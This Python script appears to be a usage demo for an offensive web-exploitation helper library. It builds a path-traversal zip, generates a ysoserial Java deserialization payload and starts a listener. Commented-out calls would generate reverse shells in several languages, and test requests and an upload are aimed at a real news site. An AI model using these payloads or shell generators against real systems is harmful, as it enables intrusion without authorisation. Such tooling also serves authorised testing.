from webpwn import *
from datetime import datetime
import time

now = datetime.date(datetime.now())
now = now.strftime("%d/%m/%Y")
exploit = webpwn("test", "highjack",now, proxy_enabled=False, debug_enabled=True, interface="eth0")
headers = {"User-Agent":"oh hi"}
response, session = exploit.request("GET","http://bbc.co.uk", redirects=False, headers=headers)
#print(response)
#print(exploit.hash("sha512", "test"))
exploit.request("UPLOAD", "http://bbc.co.uk", file_path="/tmp/test", file_parameter="booya")
zip_contents = {"normal_file": "booo", "../../../../malicious":"oh snap"}
exploit.build_zip(zip_contents, "/tmp/pwn.zip")
exploit.status(get_ip())
exploit.webserver("", 1337)
stdout, stderr = exploit.run_command("java -jar ./binaries/ysoserial.jar CommonsCollections1 whoami > payload.ser")
print(stdout)
print(stderr)

shell_generator = generateshell()
#print(shell_generator.bash("127.0.0.1","1337","/bin/bash"))
#print(shell_generator.python("127.0.0.1","1337","/bin/bash", "python2"))
#print(shell_generator.python("127.0.0.1","1337","/bin/bash", "python3"))
#print(shell_generator.node("127.0.0.1","1337","/bin/bash"))
#print(shell_generator.php("127.0.0.1","1337","/bin/bash"))
#print(shell_generator.powershell("127.0.0.1","1337"))
url_encoded = exploit.encode("te s t","url")
print(exploit.decode(url_encoded, "url"))
b64_encoded = exploit.encode("test","base64")
print(exploit.decode(b64_encoded, "base64"))

hex_encoded = exploit.encode("test", "hex")
print(hex_encoded)
print(exploit.decode(hex_encoded, "hex"))

print(exploit.create_basic_auth("test", "password"))

print(exploit.find("hell\d","xxxhell1xxx"))
